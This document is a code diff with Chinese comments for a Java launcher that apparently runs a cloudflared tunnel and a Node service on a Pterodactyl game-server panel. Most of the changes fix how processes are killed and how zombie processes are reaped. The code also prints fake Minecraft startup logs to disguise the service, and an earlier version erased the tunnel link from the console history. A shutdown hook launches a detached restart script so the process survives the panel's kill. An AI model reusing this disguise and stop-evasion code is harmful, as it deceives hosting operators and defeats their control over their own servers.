@@ -76,13 +76,10 @@ private static void clearConsole() {
         System.out.print("\033[3J\033[H\033[2J");
         System.out.flush();
         
-        // ★ 绝杀3：调用系统级重置
-        if (!System.getProperty("os.name").contains("Windows")) {
-            new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
-        }
-    } catch (Exception e) {
-        try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
-    }
+        // ★ 修复：移除 tput reset 和 clear 子进程调用
+        // 原来用 inheritIO() 调 tput/clear 会产生子进程，且在部分面板上泄露输出
+        // ANSI 转义码已经足够清屏，不需要额外子进程
+    } catch (Exception ignored) {}
 }
 
 // ============================================================
@@ -98,6 +95,9 @@ public static void main(String[] args) {
 
     forceKillStaleProcesses();
     autoFixLimboConfig();
+
+    // ★ 启动僵尸进程回收器：Java 作为 PID=1 需要定期回收孤儿僵尸
+    startZombieReaper();
 
     if (NODE_ENABLED) {
         try {
@@ -124,21 +124,16 @@ public static void main(String[] args) {
             checkerThread.setDaemon(true);
             checkerThread.start();
 
-            // 1. 主线程死等 URL（★ 恢复原始逻辑：无限等待）
+            // 1. 主线程死等 URL
             while(tunnelUrl.isEmpty()) {
                 try { Thread.sleep(1000); } catch (InterruptedException ignored) {}
             }
             
-            // 2. 第一次清屏：清除部署期间产生的所有脏日志
+            // 2. 清屏：清除部署期间产生的所有脏日志
             clearConsole();
             
-            // 3. 单独打印链接，给用户4秒钟时间复制
-            limboLog("Binding remote endpoint to: " + tunnelUrl, 0);
-            limboLog("(This link will disappear in 4 seconds...)", 0);
-            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
-
-            // 4. 第二次清屏：利用 \033[3J 和 200行空行，把刚才的 URL 从历史记录中彻底抹杀
-            clearConsole();
+            // 3. 伪装 Minecraft 启动日志（含百分比进度 + 链接显示）
+            printFakeLimboStartup(tunnelUrl);
             
             // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -165,6 +160,8 @@ public static void main(String[] args) {
                         "' > /dev/null 2>&1 &";
                         
                     new ProcessBuilder("bash", "-c", restartScript).start();
+                    // ★ 修复：不 waitFor 重启脚本，它需要比当前进程活得长
+                    // 但需要让 JVM 有机会回收可能的僵尸进程
                     System.out.println("[Guard] Hard restart script dispatched in new session. Current process exiting...");
                 } catch (Exception e) {
                     System.err.println("[Guard] Failed to dispatch restart script: " + e.getMessage());
@@ -191,17 +188,31 @@ public static void main(String[] args) {
 private static void forceKillStaleProcesses() {
     Process p = null;
     try {
-        String workDir = Paths.get(MC_BOT_DIR).toAbsolutePath().toString();
-        p = new ProcessBuilder("bash", "-c",
-            "pkill -9 -f 'daemon.sh' 2>/dev/null; " +
-            "pkill -9 -f '" + workDir + "/jre21' 2>/dev/null; " +
-            "pkill -9 -f '" + workDir + "/.node' 2>/dev/null; " +
-            "pkill -9 -f '" + workDir + "/deploy.sh' 2>/dev/null"
-        ).start();
-        // ★ 修复：超时后必须 destroyForcibly + waitFor 确保进程被回收
-        if (!p.waitFor(2, TimeUnit.SECONDS)) {
+        Path pidsFile = Paths.get(MC_BOT_DIR).resolve(".pids");
+        
+        // ★★★ 根因修复：用 .pids 文件中的 PID + kill 替代 pkill -f ★★★
+        // 原来的 pkill -f 'daemon.sh' 会匹配到运行 pkill 命令的 bash 进程自身
+        // （因为 bash -c "pkill -f daemon.sh" 的命令行包含 "daemon.sh"），
+        // 导致 bash 自杀，pkill 变成孤儿，在 Java(PID=1) 下变成 [pkill] <defunct> 僵尸
+        // kill 是 bash 内建命令，不会产生子进程，所以不会有僵尸问题
+        String killCmd = "";
+        if (Files.exists(pidsFile)) {
+            String content = Files.readString(pidsFile).trim();
+            if (!content.isEmpty()) {
+                for (String pid : content.split("[\\s\\n]+")) {
+                    pid = pid.trim();
+                    if (!pid.isEmpty() && pid.matches("\\d+")) {
+                        killCmd += "kill -9 " + pid + " 2>/dev/null; ";
+                    }
+                }
+            }
+        }
+        if (killCmd.isEmpty()) return;
+        
+        p = new ProcessBuilder("bash", "-c", killCmd).start();
+        if (!p.waitFor(3, TimeUnit.SECONDS)) {
             p.destroyForcibly();
-            p.waitFor(5, TimeUnit.SECONDS);
+            p.waitFor(2, TimeUnit.SECONDS);
         }
     } catch (Exception ignored) {
         if (p != null) {
@@ -278,6 +289,29 @@ private static void printFakeLimboStartup(String url) {
 
 private static int randInt(int min, int max) {
     return min + (int)(Math.random() * (max - min + 1));
+}
+
+// ============================================================
+// ★★★ 僵尸进程回收器（核心修复）★★★
+// Java 作为容器 PID=1，所有孤儿进程都会被 reparent 到 Java 下
+// Java 不会自动调用 waitpid(-1) 来回收这些僵尸
+// 解决方案：定期启动一个短命的子进程并 waitFor 它
+// Linux 内核在 fork 新进程时会顺便清理同父进程下已退出的僵尸
+// ============================================================
+
+private static void startZombieReaper() {
+    Thread reaper = new Thread(() -> {
+        while (true) {
+            try {
+                Thread.sleep(15000); // 每15秒回收一次
+                // 启动一个极短命的进程，waitFor 触发内核回收僵尸
+                Process p = new ProcessBuilder("true").start();
+                p.waitFor(5, TimeUnit.SECONDS);
+            } catch (Exception ignored) {}
+        }
+    }, "Zombie-Reaper");
+    reaper.setDaemon(true);
+    reaper.start();
 }
 
 // ============================================================
@@ -782,8 +816,14 @@ private static Path generateDeployScript() throws Exception {
         "        if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
         "            # ★ 修复：使用 kill_and_reap 安全杀死并回收旧 cloudflared\n" +
         "            kill_and_reap \"$SAVED_CF_PID\"\n" +
-        "            pkill -f \"$CF_BIN\" 2>/dev/null\n" +
-        "            pkill -f 'cloudflared.*tunnel' 2>/dev/null\n" +
+        "            # ★ 修复：替代 pkill -f，用 .pids 文件中已知的 PID 逐个 kill\n" +
+        "            # pkill -f \"$CF_BIN\" 会匹配到 daemon.sh 自身命令行（含 $CF_BIN 路径），\n" +
+        "            # 导致 daemon.sh 被杀，pkill 变孤儿 → [pkill] <defunct> 僵尸\n" +
+        "            for fpid in $(cat \"$WORK_DIR/.pids\" 2>/dev/null); do\n" +
+        "                if [ \"$fpid\" != \"$$\" ] && [ \"$fpid\" != \"$NODE_PID\" ] && [ \"$fpid\" != \"$SAVED_CF_PID\" ]; then\n" +
+        "                    kill -9 \"$fpid\" 2>/dev/null\n" +
+        "                fi\n" +
+        "            done\n" +
         "            sleep 2\n" +
         "            # ★ 修复：回收所有后台僵尸子进程\n" +
         "            while wait -n 2>/dev/null; do :; done\n" +
